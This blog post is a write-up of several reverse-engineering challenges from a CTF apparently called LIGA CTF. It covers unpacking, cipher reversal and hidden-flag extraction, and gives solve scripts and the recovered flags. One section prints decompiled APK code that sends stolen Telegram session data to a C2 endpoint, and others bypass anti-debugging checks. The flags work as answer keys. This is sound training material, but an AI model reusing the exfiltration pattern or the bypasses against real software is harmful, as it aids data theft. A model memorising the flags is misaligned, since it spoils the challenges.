---
title: "LIGA CTF: Reverse Engineering [W1]"
date: 2026-05-26
categories: [CTF]
tags: [CTF]
image: https://www.notion.so/image/attachment%3A066d0420-dd43-458e-babe-87310e4d1d7e%3Aimage.png?table=block&id=36a26e60-5e7e-8083-b0cb-e6a73cbd19b4&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl
---

## Logon Test

This is to verify if you have successfully log in.

The flag format for this CTF can be one of the followings:

- liga{xxx}
- OWASPKL{xxx}
- ligactf{xxx}

Each challenge description will explicitly mention which flag format to use.

Submit OWASPKL{FR33\_FL4G} to earn free point of this challenge.

Flag: `OWASPKL{FR33_FL4G}`

---

## Find the C2 Server

This APK file is malicious. It secretly talks to a C2 Server. Identify the C2 Server address, and find the flag.

Flag format: OWASPKL{xxx}

On decompiled source of java using jadx. On MainActivity, a string was called

```
    /* renamed from: String$val-d1$try$fun-$anonymous$$arg-5$call-thread$fun-backdoorC2$class-MainActivity, reason: not valid java name */
    private static String f98x506ff06 = "https://appsecmy.com/";

    /* renamed from: String$val-d2$try$fun-$anonymous$$arg-5$call-thread$fun-backdoorC2$class-MainActivity, reason: not valid java name */
    private static String f99xcc12e607 = "pages/liga-ctf-2026";

    /* renamed from: String$arg-0$call-setRequestMethod$try$fun-$anonymous$$arg-5$call-thread$fun-backdoorC2$class-MainActivity, reason: not valid java name */
    private static String f88xf204d679 = "POST";
    
    /* renamed from: Boolean$arg-0$call-setDoOutput$try$fun-$anonymous$$arg-5$call-thread$fun-backdoorC2$class-MainActivity, reason: not valid java name */
    private static boolean f53xb9b2a8a0 = true;

    /* renamed from: String$arg-0$call-setRequestProperty$try$fun-$anonymous$$arg-5$call-thread$fun-backdoorC2$class-MainActivity, reason: not valid java name */
    private static String f89xd700fed = "Content-Type";

    /* renamed from: String$arg-1$call-setRequestProperty$try$fun-$anonymous$$arg-5$call-thread$fun-backdoorC2$class-MainActivity, reason: not valid java name */
    private static String f97x3d2743ee = "application/json";
```

C2 URL is constructed by concatenating two string constants:

- `d1` = `https://appsecmy.com/`
- `d2` = `pages/liga-ctf-2026`

So the C2 is: `https://appsecmy.com/pages/liga-ctf-2026`

The app POSTs exfiltrated data (stolen Telegram session content) to that endpoint as JSON, with the `Content-Type: application/json` header.

when reconstruct those C2 and curl it

```
┌──(myenv)(osiris㉿ALICE)-[~]
└─$ curl https://appsecmy.com/pages/liga-ctf-2026 | grep "OWASPKL{"
    <!-- OWASPKL{https://chat.whatsapp.com/KAdpus4R0pb895ulC2jo8p} This is the FL4G. But feel free to join our Community Group-->
```

Flag: `OWASPKL{https://chat.whatsapp.com/KAdpus4R0pb895ulC2jo8p}`

---

## unpackme0 - Easy

With that out of the way, your first task is to identify the packer used for this binary, and unpack it. Provide the md5 hash of the unpacked file as your flag. Example: OWASPKL{23ac7b66851387b96a20672b5c0dc856}

directly

```
upx -d <file>
```

Solving

```
PS C:\Users\os1ris\Desktop > certutil -hashfile unpackme0 md5
MD5 hash of unpackme0:
1cc6a3b62cac36ab18e0c4685a7f4bdf
```

Flag: `OWASPKL{1cc6a3b62cac36ab18e0c4685a7f4bdf}`

---

## unpackme1 - Medium

Well done, by now you should hopefully understand more about packed binaries. Things won't be as straightforward anymore though. A simple anti unpacking technique was applied to this packed binary.

Your next task is the same: identify the packer used for this binary, and unpack it. Instead of getting the file hash, the flag is hidden in the unpacked file as a string. Format: OWASPKL{Im\_A\_Flag}

### Observation

The file mentions VQY packer which seems to be a custom/fictional packer for the CTF. But I also see UPX markers ("UPX!" string appears)

The binary has "VQY!" markers and "UPX!" markers in the text. The VQY packer is likely just a modified UPX with the magic bytes changed. we can change the magic bytes of `VQY!` into `UPX!` and try to manually fix them.

```
data = open('/os1ris/unpackme1','rb').read()
patched = data.replace(b'VQY!', b'UPX!')
open('/os1ris/patched', 'wb').write(patched)
```

### Unpack

and then try unpack it back using UPX

```
$ upx -d <file>
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2024
UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     24527 <-      6596   26.89%   linux/amd64   unpackme1_patch

Unpacked 1 file.
```

directly string the file

```
$ strings unpackme1_patch | grep -i "OWASPKL”
Format: OWASPKL{Im_A_Flag}
OWASPKL{Unpackm3_4mat3ur0923257}
```

Flag: `OWASPKL{Unpackm3_4mat3ur0923257}`

---

## unpackme2 - Medium

Your next task is the same: identify the packer used for this binary, and unpack it. The flag for this challenge is made up of two parts: The name of the packer (in all caps), and the flag string in the binary. The flag string does NOT follow the OWASPKL{} flag format! It’s simply a string in l33tspeak hidden in the program. The two parts are separated with an underscore (\_).

Format: OWASPKL{\[PACKERNAME\]\_\[EXAMPLEFLAG\]} Example: OWASPKL{MYPACKER\_3xampl3Fl4g}

### Dynamic

the packer was ASPack when checking on Detect It Easy. Using xdbg32. set breakpoint on **VirtualProtect**. Watch the EAX and follow the dump will able to see the leetspeak code.

![](https://www.notion.so/image/attachment%3Ad5232d28-c925-4d94-864d-7c4d1035422e%3Aimage.png?table=block&id=36a26e60-5e7e-80c6-a2fd-dfbe662a334f&spaceId=2b1ea456-18af-403c-953f-e1f8e610fc0e&width=1220&userId=&cache=v2&imgBuildSrc=requestProxiedImageUrl)

Flag: `OWASPKL{ASPACK_Unpackm3C0mpl3te}`

---

## Lockbox

### Decompile

```
Disassembly of section .init:

000000000040033c <.init>:
  40033c:	f3 0f 1e fa          	endbr64
  400340:	48 83 ec 08          	sub    rsp,0x8
  400344:	48 8b 05 95 2c 00 00 	mov    rax,QWORD PTR [rip+0x2c95]        # 402fe0 <putc@plt+0x2c30>
  40034b:	48 85 c0             	test   rax,rax
  40034e:	74 02                	je     400352 <puts@plt-0x1e>
  400350:	ff d0                	call   rax
  400352:	48 83 c4 08          	add    rsp,0x8
  400356:	c3                   	ret

Disassembly of section .plt:

0000000000400360 <puts@plt-0x10>:
  400360:	ff 35 8a 2c 00 00    	push   QWORD PTR [rip+0x2c8a]        # 402ff0 <putc@plt+0x2c40>
  400366:	ff 25 8c 2c 00 00    	jmp    QWORD PTR [rip+0x2c8c]        # 402ff8 <putc@plt+0x2c48>
  40036c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000400370 <puts@plt>:
  400370:	ff 25 8a 2c 00 00    	jmp    QWORD PTR [rip+0x2c8a]        # 403000 <putc@plt+0x2c50>
  400376:	68 00 00 00 00       	push   0x0
  40037b:	e9 e0 ff ff ff       	jmp    400360 <puts@plt-0x10>

0000000000400380 <strlen@plt>:
  400380:	ff 25 82 2c 00 00    	jmp    QWORD PTR [rip+0x2c82]        # 403008 <putc@plt+0x2c58>
  400386:	68 01 00 00 00       	push   0x1
  40038b:	e9 d0 ff ff ff       	jmp    400360 <puts@plt-0x10>

0000000000400390 <printf@plt>:
  400390:	ff 25 7a 2c 00 00    	jmp    QWORD PTR [rip+0x2c7a]        # 403010 <putc@plt+0x2c60>
  400396:	68 02 00 00 00       	push   0x2
  40039b:	e9 c0 ff ff ff       	jmp    400360 <puts@plt-0x10>

00000000004003a0 <strcmp@plt>:
  4003a0:	ff 25 72 2c 00 00    	jmp    QWORD PTR [rip+0x2c72]        # 403018 <putc@plt+0x2c68>
  4003a6:	68 03 00 00 00       	push   0x3
  4003ab:	e9 b0 ff ff ff       	jmp    400360 <puts@plt-0x10>

00000000004003b0 <putc@plt>:
  4003b0:	ff 25 6a 2c 00 00    	jmp    QWORD PTR [rip+0x2c6a]        # 403020 <putc@plt+0x2c70>
  4003b6:	68 04 00 00 00       	push   0x4
  4003bb:	e9 a0 ff ff ff       	jmp    400360 <puts@plt-0x10>

Disassembly of section .text:

00000000004003c0 <.text>:
  4003c0:	f3 0f 1e fa          	endbr64
  4003c4:	31 ed                	xor    ebp,ebp
  4003c6:	49 89 d1             	mov    r9,rdx
  4003c9:	5e                   	pop    rsi
  4003ca:	48 89 e2             	mov    rdx,rsp
  4003cd:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
  4003d1:	50                   	push   rax
  4003d2:	54                   	push   rsp
  4003d3:	45 31 c0             	xor    r8d,r8d
  4003d6:	31 c9                	xor    ecx,ecx
  4003d8:	48 c7 c7 ce 05 40 00 	mov    rdi,0x4005ce
  4003df:	ff 15 f3 2b 00 00    	call   QWORD PTR [rip+0x2bf3]        # 402fd8 <putc@plt+0x2c28>
  4003e5:	f4                   	hlt
  4003e6:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  4003ed:	00 00 00 
  4003f0:	f3 0f 1e fa          	endbr64
  4003f4:	c3                   	ret
  4003f5:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  4003fc:	00 00 00 
  4003ff:	90                   	nop
  400400:	b8 30 30 40 00       	mov    eax,0x403030
  400405:	48 3d 30 30 40 00    	cmp    rax,0x403030
  40040b:	74 13                	je     400420 <putc@plt+0x70>
  40040d:	b8 00 00 00 00       	mov    eax,0x0
  400412:	48 85 c0             	test   rax,rax
  400415:	74 09                	je     400420 <putc@plt+0x70>
  400417:	bf 30 30 40 00       	mov    edi,0x403030
  40041c:	ff e0                	jmp    rax
  40041e:	66 90                	xchg   ax,ax
  400420:	c3                   	ret
  400421:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
  400425:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
  40042c:	00 00 00 00 
  400430:	be 30 30 40 00       	mov    esi,0x403030
  400435:	48 81 ee 30 30 40 00 	sub    rsi,0x403030
  40043c:	48 89 f0             	mov    rax,rsi
  40043f:	48 c1 ee 3f          	shr    rsi,0x3f
  400443:	48 c1 f8 03          	sar    rax,0x3
  400447:	48 01 c6             	add    rsi,rax
  40044a:	48 d1 fe             	sar    rsi,1
  40044d:	74 11                	je     400460 <putc@plt+0xb0>
  40044f:	b8 00 00 00 00       	mov    eax,0x0
  400454:	48 85 c0             	test   rax,rax
  400457:	74 07                	je     400460 <putc@plt+0xb0>
  400459:	bf 30 30 40 00       	mov    edi,0x403030
  40045e:	ff e0                	jmp    rax
  400460:	c3                   	ret
  400461:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
  400465:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
  40046c:	00 00 00 00 
  400470:	f3 0f 1e fa          	endbr64
  400474:	80 3d bd 2b 00 00 00 	cmp    BYTE PTR [rip+0x2bbd],0x0        # 403038 <stdout@GLIBC_2.2.5+0x8>
  40047b:	75 13                	jne    400490 <putc@plt+0xe0>
  40047d:	55                   	push   rbp
  40047e:	48 89 e5             	mov    rbp,rsp
  400481:	e8 7a ff ff ff       	call   400400 <putc@plt+0x50>
  400486:	c6 05 ab 2b 00 00 01 	mov    BYTE PTR [rip+0x2bab],0x1        # 403038 <stdout@GLIBC_2.2.5+0x8>
  40048d:	5d                   	pop    rbp
  40048e:	c3                   	ret
  40048f:	90                   	nop
  400490:	c3                   	ret
  400491:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
  400495:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
  40049c:	00 00 00 00 
  4004a0:	f3 0f 1e fa          	endbr64
  4004a4:	eb 8a                	jmp    400430 <putc@plt+0x80>
  4004a6:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  4004ad:	00 00 00 
  4004b0:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
  4004b7:	00 00 00 
  4004ba:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
  4004c0:	8d 47 9f             	lea    eax,[rdi-0x61]
  4004c3:	3c 19                	cmp    al,0x19
  4004c5:	76 0b                	jbe    4004d2 <putc@plt+0x122>
  4004c7:	8d 57 bf             	lea    edx,[rdi-0x41]
  4004ca:	89 f8                	mov    eax,edi
  4004cc:	80 fa 19             	cmp    dl,0x19
  4004cf:	76 26                	jbe    4004f7 <putc@plt+0x147>
  4004d1:	c3                   	ret
  4004d2:	40 0f be ff          	movsx  edi,dil
  4004d6:	83 ef 54             	sub    edi,0x54
  4004d9:	48 63 c7             	movsxd rax,edi
  4004dc:	48 69 c0 4f ec c4 4e 	imul   rax,rax,0x4ec4ec4f
  4004e3:	48 c1 f8 23          	sar    rax,0x23
  4004e7:	89 fa                	mov    edx,edi
  4004e9:	c1 fa 1f             	sar    edx,0x1f
  4004ec:	29 d0                	sub    eax,edx
  4004ee:	6b c0 1a             	imul   eax,eax,0x1a
  4004f1:	29 c7                	sub    edi,eax
  4004f3:	8d 47 61             	lea    eax,[rdi+0x61]
  4004f6:	c3                   	ret
  4004f7:	40 0f be ff          	movsx  edi,dil
  4004fb:	83 ef 34             	sub    edi,0x34
  4004fe:	48 63 c7             	movsxd rax,edi
  400501:	48 69 c0 4f ec c4 4e 	imul   rax,rax,0x4ec4ec4f
  400508:	48 c1 f8 23          	sar    rax,0x23
  40050c:	89 fa                	mov    edx,edi
  40050e:	c1 fa 1f             	sar    edx,0x1f
  400511:	29 d0                	sub    eax,edx
  400513:	6b c0 1a             	imul   eax,eax,0x1a
  400516:	29 c7                	sub    edi,eax
  400518:	8d 47 41             	lea    eax,[rdi+0x41]
  40051b:	c3                   	ret
  40051c:	55                   	push   rbp
  40051d:	53                   	push   rbx
  40051e:	48 83 ec 68          	sub    rsp,0x68
  400522:	48 b8 7d 4c 4d 33 33 	movabs rax,0x35444833334d4c7d
  400529:	48 44 35 
  40052c:	48 89 44 24 30       	mov    QWORD PTR [rsp+0x30],rax
  400531:	48 b8 5f 41 30 5a 33 	movabs rax,0x335f59335a30415f
  400538:	59 5f 33 
  40053b:	48 89 44 24 38       	mov    QWORD PTR [rsp+0x38],rax
  400540:	48 b8 31 47 30 45 5f 	movabs rax,0x6d436d5f45304731
  400547:	6d 43 6d 
  40054a:	48 89 44 24 40       	mov    QWORD PTR [rsp+0x40],rax
  40054f:	48 b8 33 7b 59 58 43 	movabs rax,0x4a4e464358597b33
  400556:	46 4e 4a 
  400559:	48 89 44 24 48       	mov    QWORD PTR [rsp+0x48],rax
  40055e:	c6 44 24 50 42       	mov    BYTE PTR [rsp+0x50],0x42
  400563:	48 8d 44 24 50       	lea    rax,[rsp+0x50]
  400568:	48 89 e3             	mov    rbx,rsp
  40056b:	48 89 e2             	mov    rdx,rsp
  40056e:	48 8d 74 24 2f       	lea    rsi,[rsp+0x2f]
  400573:	66 90                	xchg   ax,ax
  400575:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
  40057c:	00 00 00 00 
  400580:	0f b6 08             	movzx  ecx,BYTE PTR [rax]
  400583:	88 0a                	mov    BYTE PTR [rdx],cl
  400585:	48 83 e8 01          	sub    rax,0x1
  400589:	48 83 c2 01          	add    rdx,0x1
  40058d:	48 39 f0             	cmp    rax,rsi
  400590:	75 ee                	jne    400580 <putc@plt+0x1d0>
  400592:	48 8d 6b 21          	lea    rbp,[rbx+0x21]
  400596:	0f be 3b             	movsx  edi,BYTE PTR [rbx]
  400599:	e8 22 ff ff ff       	call   4004c0 <putc@plt+0x110>
  40059e:	0f be f8             	movsx  edi,al
  4005a1:	48 8b 35 88 2a 00 00 	mov    rsi,QWORD PTR [rip+0x2a88]        # 403030 <stdout@GLIBC_2.2.5>
  4005a8:	e8 03 fe ff ff       	call   4003b0 <putc@plt>
  4005ad:	48 83 c3 01          	add    rbx,0x1
  4005b1:	48 39 eb             	cmp    rbx,rbp
  4005b4:	75 e0                	jne    400596 <putc@plt+0x1e6>
  4005b6:	48 8b 35 73 2a 00 00 	mov    rsi,QWORD PTR [rip+0x2a73]        # 403030 <stdout@GLIBC_2.2.5>
  4005bd:	bf 0a 00 00 00       	mov    edi,0xa
  4005c2:	e8 e9 fd ff ff       	call   4003b0 <putc@plt>
  4005c7:	48 83 c4 68          	add    rsp,0x68
  4005cb:	5b                   	pop    rbx
  4005cc:	5d                   	pop    rbp
  4005cd:	c3                   	ret
  4005ce:	41 56                	push   r14
  4005d0:	41 54                	push   r12
  4005d2:	55                   	push   rbp
  4005d3:	53                   	push   rbx
  4005d4:	48 83 ec 28          	sub    rsp,0x28
  4005d8:	89 fd                	mov    ebp,edi
  4005da:	48 89 f3             	mov    rbx,rsi
  4005dd:	bf a0 12 40 00       	mov    edi,0x4012a0
  4005e2:	e8 89 fd ff ff       	call   400370 <puts@plt>
  4005e7:	83 fd 02             	cmp    ebp,0x2
  4005ea:	7e 52                	jle    40063e <putc@plt+0x28e>
  4005ec:	4c 8b 63 08          	mov    r12,QWORD PTR [rbx+0x8]
  4005f0:	be b1 12 40 00       	mov    esi,0x4012b1
  4005f5:	4c 89 e7             	mov    rdi,r12
  4005f8:	e8 a3 fd ff ff       	call   4003a0 <strcmp@plt>
  4005fd:	89 c5                	mov    ebp,eax
  4005ff:	85 c0                	test   eax,eax
  400601:	74 54                	je     400657 <putc@plt+0x2a7>
  400603:	be d0 12 40 00       	mov    esi,0x4012d0
  400608:	4c 89 e7             	mov    rdi,r12
  40060b:	e8 90 fd ff ff       	call   4003a0 <strcmp@plt>
```

The note claimed the only way was `--unlock <code>` with a 64-character HMAC key, and also said `strings` showed nothing useful.

But `strings` showed suspicious chunks:

```
}LM33HD5H
_A0Z3Y_3H
1G0E_mCmH
3{YXCFNJH
```

### Process Flow

After checking the binary, the message was:

1. Stored in separated chunks
1. Reversed
1. ROT13-decoded

There was also an emergency path:

```
./lockbox--emergency 0v3rr1d3
```

Output:

```
[lockbox] ready.
[lockbox] emergency path triggered.
[lockbox] emergency key accepted.
OWASPKL{3zPz_R0T13_L3M0N_5QU33ZY}
```

Simplest solve script:

```
import codecs

data="}LM33HD5_A0Z3Y_31G0E_mCm3{YXCFNJB"
flag=codecs.decode(data[::-1],"rot_13")

print(flag)
```

Flag: `OWASPKL{3zPz_R0T13_L3M0N_5QU33ZY}`

---

## codec-auth

A Python `.pyc` binary wrapped in a Metal Gear Solid FOXHOUND skin. The binary validates an operator token through a multi-stage authentication check. The AES-GCM branding is pure misdirection — the real cipher is a 25-round custom SPN. Once you load the bytecode, everything falls out deterministically.

### **Step 1 — The Magic Number Problem**

Running `file` on `codec-auth.pyc` gives nothing useful. Checking the header:

```
magic: 2b 0e 0d 0a
```

`0x0e2b` = 3627 — that's **Python 3.14**, not the system Python 3.13. `marshal.loads()` fails silently on 3.13 because the code object format changed. Fix: install `python@3.14` via brew and load the file directly.

```
import marshal
data = open('codec-auth.pyc', 'rb').read()
code = marshal.loads(data[16:])   # header is 16 bytes for Python 3.14
```

The challenge description hint — *"Python 3.14 tooling won't cooperate with the module-level runner"* — refers to the anti-analysis hooks installed at module load time, not the marshal step itself.

### **Step 2 — Anti-Analysis Hooks**

The module-level code does three things before anything else:

1. `_ah` — installs `sys.addaudithook` to monitor exec/eval calls
1. `_hw` — replaces `builtins.exec`, `builtins.eval`, and `builtins.compile` with a wrapper
1. `_init_codec` — checks for `sys.gettrace` / `sys.getprofile` / monitoring hooks and XORs `_entropy` with `57005` if a debugger is detected

The entropy mechanism is interesting:

```
# _init_codec (no debugger)
_entropy = 0 ^ 90          # → 90 = 0x5A

# _init_codec (debugger detected)
_entropy = 0 ^ 90 ^ 57005  # → 57079 = 0xDEF7
```

This gates the `_4uth_ch3ck` state machine: the entropy check at state `92` computes `_exp = (90 + len(body)) & 0xFFFF` and requires `_entropy & 0xFFFF == _exp`. With the correct entropy (90) and `len(body) = 59`, the check trivially passes. Under a debugger it would fail immediately.

**Bypass:** `exec(code, {'__name__': 'codec_analysis', '__builtins__': builtins})` — running with a non-`__main__` name skips `main()` and all hooks. Then call functions directly.

### **Step 3 — The State Machine**

`_4uth_ch3ck(candidate)` is a deterministic state machine:

```
State 163  →  _check_format(candidate)
               token must match: OWASPKL{ ... }
               _entropy += len(body)

State 92   →  entropy gate (always passes under normal conditions)

State 231  →  _fr3q_l0ck(body)   ← real cipher check

State 27   →  _entropy rotated left 3 bits (16-bit)
               _s3q_v3r(body)    ← SHA256-based check

State 143  →  return True
State 98   →  return False
```

The description says *"only l33tspeak function names carry real logic"*. The English-named functions (`foxhound_codec_encrypt`, `_foxhound_aes_gcm_auth`, etc.) are entirely decorative.

### **Step 4 — The Cipher \[**`_c1ph_rnd` **\]**

The cipher is a **25-round SPN** operating on a 64-bit block with an 80-bit key. Three components:

**S-Box** — constructed at runtime from two hardcoded bytearrays XOR'd together:

```
p0 = [12, 6, 8, 7, 14, 7, 5, 2, 15, 14, 5, 12, 4, 4, 1, 2]
p1 = [10, 3, 7, 13, 14, 9, 2, 11,  4, 15, 6,  1, 12, 8, 5, 0]
p2 = [a ^ b for a, b in zip(p0, p1)]
# → [6, 5, 15, 10, 0, 14, 7, 9, 11, 1, 3, 13, 8, 12, 4, 2]
```

The obfuscation makes it look like two separate tables, but it's just one XOR'd S-Box — a valid 4-bit permutation (all 0–15 values present exactly once).

**Key schedule (**`_r0und_k3y`**)** — PRESENT-style on an 80-bit key:

1. Apply S-Box to top nibble of `K`
1. Rotate `K` left by 8 bits (mod 2⁸⁰)
1. XOR bits `[19:15]` with round counter: `K ^= ((rc + 1) << 15)`

**Round function (**`_c1ph_rnd`**):**

1. Split 64-bit block into 4 × 16-bit words
1. For each of 25 rounds:
  - XOR state with round key
  - Apply S-Box nibble-by-nibble via bit decomposition (bitsliced)
  - Rotate `s[1]` left 1, `s[2]` left 6, `s[3]` left 13 (differential diffusion layer)
1. Pack back to 8 bytes

The rotations and 25 rounds diverge from standard PRESENT (which uses 31 rounds and a bit-permutation layer). This is a bespoke variant.

### **Step 5 — Reversing** `_fr3q_l0ck`

This function validates `body` (must be exactly 59 chars). Full logic:

```
1. Three fixed cipher calls (hardcoded block + key → fixed output):
   _rm = cipher(d41f8a03e6c27b5f, a92c14f73d8801bec56a) = beaf4ba2194c27fd
   _sm = cipher(7ef329d04ab891cc, 15ea478df236c90b73d5) = 94abb5d536f2eaa1
   _bm = cipher(865ae13cf90d62b4, c72e934fa01bd864e537) = 62987e17f7cef2b9

2. Stream-decode q0[:19] (initial state = 90):
   key_byte_i = (state ^ (i * 31)) & 0xFF
   decoded_i  = q0[i] ^ key_byte_i
   state      = (state + decoded_i + i) & 0xFF
   → r1 = b'FOXHOUND_CODEC_V4_1'   (19 bytes)

   XOR r1 with _rm (repeating 8-byte key)

3. Same decode on q1[:23] → r3 = b'OUTER_HEAVEN_PROTOCOL_7'  (23 bytes)
   XOR r3 with _sm

4. _q2 (64 hardcoded bytes) XOR'd with _bm → _q2c

5. _r4 = pbkdf2_hmac('sha256', r1, r3, 700000, dklen=64)
   (iterations = 699808 + p3 where p3 = (p2[0] << 5) ^ (p2[4] << 6) = 192)

6. Validation: for every i in range(59):
      ord(body[i]) == _q2c[i] ^ _r4[i]
```

**All inputs are constants.** The PBKDF2 password and salt are decoded from hardcoded byte arrays; the cipher outputs are from hardcoded keys; `_q2c` is a hardcoded XOR table. The expected body is fully determined:

```
expected = bytes(_q2c[i] ^ _r4[i] for i in range(59))
# → b'sp3n_c1ph3r_0ut3r_h34v3n_c0d3c_sh10k_st34dy_l4h_s0l1d_sn4k3'
```

No brute force. No guessing. Just follow the math.

### **Step 6 —** `_s3q_v3r` **Check**

Secondary check using SHA256:

```
_s0 = 'sha256'   # decoded from (117, 109, 110, 56, 53, 56) XOR p2
_k1 = hashlib.sha256(body.encode()).digest()[:10]

# Stream-decode q0[:8] → b'FOXhound'
# cipher(b'FOXhound', _k1) must equal stream-decoded q1[:8]
```

Since the expected body is already determined, SHA256 of the correct body produces exactly the key that satisfies this check. No independent constraint to solve.

---

**Solve Script**

```
import marshal, builtins, hashlib

data   = open('codec-auth.pyc', 'rb').read()
ns     = {'__name__': 'codec_analysis', '__builtins__': builtins}
exec(marshal.loads(data[16:]), ns)

c = ns['_c1ph_rnd']

rm = c(bytes.fromhex('d41f8a03e6c27b5f'), bytes.fromhex('a92c14f73d8801bec56a'))
sm = c(bytes.fromhex('7ef329d04ab891cc'), bytes.fromhex('15ea478df236c90b73d5'))
bm = c(bytes.fromhex('865ae13cf90d62b4'), bytes.fromhex('c72e934fa01bd864e537'))

def stream_decode(data, n, key_bytes):
    state, result = 90, bytearray()
    for i, b in enumerate(data[:n]):
        rk = (state ^ (i * 31)) & 0xFF
        rc = b ^ rk
        result.append(rc)
        state = (state + rc + i) & 0xFF
    return bytearray(result[i] ^ key_bytes[i % 8] for i in range(n))

q0 = bytes([162,173,30,255,31,13,126,124,197,62,136,123,145,189,247,185,7,232,76,0,0,0,0,0])
q1 = bytes([129,212,235,218,178,36,220,81,122,222,252,250,199,126,244,251,241,122,94,89,45,239,252,0])
q2 = bytes([29,99,59,238,131,82,66,59,67,18,49,117,145,221,111,221,
            103,166,82,219,233,216,140,159,134,214,109,204,210,64,113,37,
            199,91,32,169,193,150,253,236,146,165,59,98,3,211,138,14,
            97,36,101,116,250,1,20,47,186,163,51,23,247,206,242,185])

r1   = stream_decode(q0, 19, rm)   # b'FOXHOUND_CODEC_V4_1'
r3   = stream_decode(q1, 23, sm)   # b'OUTER_HEAVEN_PROTOCOL_7'
q2c  = bytes(q2[i] ^ bm[i % 8] for i in range(64))
r4   = hashlib.pbkdf2_hmac('sha256', bytes(r1), bytes(r3), 700000, dklen=64)
body = bytes(q2c[i] ^ r4[i] for i in range(59)).decode()

ns['_entropy'] = 0
ns['_init_codec']()
assert ns['_4uth_ch3ck']('OWASPKL{' + body + '}')
print(f'liga{{{body}}}')
```

Flag: `liga{sp3n_c1ph3r_0ut3r_h34v3n_c0d3c_sh10k_st34dy_l4h_s0l1d_sn4k3}`

---

## memdiag.ai

During an endpoint crash response, your SOC receives `host_memdiag`, a third-party memory diagnostic binary. A rushed analyst pastes reverse-engineering output into an internal AI assistant and returns with a confident verdict: "safe utility, approve temporary allowlist."

Before the allowlist is approved, you are asked to validate the verdict manually.

Prove whether the AI can be trusted — by reversing the sample and recovering the hidden operator note.

Tip: Start with static analysis. Treat the AI analysis report as evidence for interpretation, not as ground truth — the disassembly is the source of truth, the report is not.

Flag format: OWASPKL{...}

### Flow

The file is `host_memdiag: ELF 64-bit LSB executable, stripped`

while performing static flow was

```
if (argc == 3) {
    argv[2] parsed as hex must equal 0xdeadc0de;
    argv[1] must pass a custom hash check;
    then it writes ./memdiag_dump.bmp
}
```

### Custom Hash

so the custom hash will be:

```
h = 0;
for each byte c:
    h = h * 0x83 + c;

target: 0xa15ded69
```

`memdiag-override` matches that hash. Running the gated path:

```
./host_memdiag memdiag-override 0xdeadc0de
```

that will create `memdiag_dump.bmp`

The BMP pixel data starts as `AWOKPSt{L5urn_t4_0t_I5ury_tru0y3_}s3`

Because BMP stores pixels in **BGR**, reversing each 3-byte pixel, the script will be:

```
data=open('memdiag_dump.bmp','rb').read()[54:]
print(data)
print(data.decode())
print(b''.join(data[i:i+3][::-1] for i in range(0,len(data),3)).decode())
```

Flag: `OWASPKL{tru5t_n0_4I_tru5t_y0ur_3y3s}`

---

## Glyphed\_Secrets

### Flow

What happened:

```
main loads scene_XX.png files
→ OCRs glyph text from images
→ rebuilds a hidden DSL program
→ parses that DSL
→ checks the flag through round() and final()
```

The rebuilt hidden program starts like:

```
k0[8]={0x10293847,...};
k1[8]={0x9e3779b9,...};
k2[8]={0xf0e1d2c3,...};
k3[8]={0x89abcdef,...};

init(){s0=0x13579bdf;}
round(i,x){
  a=x^rl(s0+k0[i],5);
  b=a+k1[i];
  s0=rl((b^k2[i]),7);
  o0=s0^k3[i];
}
final(){o0=s0^0xa5a5a5a5;}
```

Verified:

```
$ ./main . <<<'OWASPKL{glyph_ocr_stateflow_x26}'
/* OUTPUT
Access granted.
Flag: OWASPKL{glyph_ocr_stateflow_x26} 
*/
```

### Solution

```
import struct

k0 = [0x10293847,0x55667788,0x89abcdef,0x31415926,0x27182818,0x0badc0de,0x7f4a7c15,0x1234fedc]
k1 = [0x9e3779b9,0xa5a5a5a5,0x55aa55aa,0x01020304,0x76543210,0xc001d00d,0xbead2222,0x42424242]
k2 = [0xf0e1d2c3,0x13579bdf,0x2468ace0,0x0f1e2d3c,0x11223344,0xdeadbabe,0x99aabbcc,0x5aa55aa5]
k3 = [0x89abcdef,0x0ddc0ffe,0x12481632,0x90909090,0x33333333,0xabcdef01,0x7654c321,0xfaceb00c]

target = [
    0x30e40e77, 0x3e7b9b5e, 0xf9d7fb37, 0x3b488917,
    0xc5e5dd6b, 0x8421e715, 0x898f18d1, 0x1fb4fce1
]

def rol(x, n):
    x &= 0xffffffff
    return ((x << n) | (x >> (32 - n))) & 0xffffffff

def ror(x, n):
    x &= 0xffffffff
    return ((x >> n) | (x << (32 - n))) & 0xffffffff

s = 0x13579bdf
parts = []

for i, out in enumerate(target):
    s_new = out ^ k3[i]
    b = ror(s_new, 7) ^ k2[i]
    a = (b - k1[i]) & 0xffffffff
    x = a ^ rol((s + k0[i]) & 0xffffffff, 5)

    parts.append(struct.pack("<I", x))
    s = s_new

flag = b"".join(parts).decode()
print(flag)
```

Flag: `OWASPKL{glyph_ocr_stateflow_x26}`

---

## Atari\_Breakout

This is one of my favorite computer games that I played during my childhood. Therefore, I tried to recreate the game and hid a flag inside. Can you find it? XD Flag Format: OWASPKL{xxx}

The binary embeds a PNG in `.data`, loaded through `SDL_RWFromMem` / `IMG_Load_RW`. Extracting that embedded PNG reveals the flag text.

```
from pathlib import Path

p = Path("/mnt/data/breakout").read_bytes()
base_va = 0x9160
base_off = 0x8160
items = [("US0JFpkLGR.png", 0x91A0, 7197), ("GQ3mHqOK6n.jpg", 0xADE0, 31911)]
